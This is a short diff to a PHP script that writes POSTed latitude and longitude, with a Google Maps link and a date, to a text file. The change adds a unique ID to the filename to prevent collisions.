@@ -25,8 +25,9 @@ if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
             "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
             "Date: " . $date . "\r\n";
     
-    // Create a unique filename with timestamp
-    $file = 'location_' . $date . '.txt';
+    // Create a unique filename with timestamp and a unique ID to prevent collisions
+    $uniqueId = uniqid();
+    $file = 'location_' . $date . '_' . $uniqueId . '.txt';
     
     try {
         $fp = fopen($file, 'w');
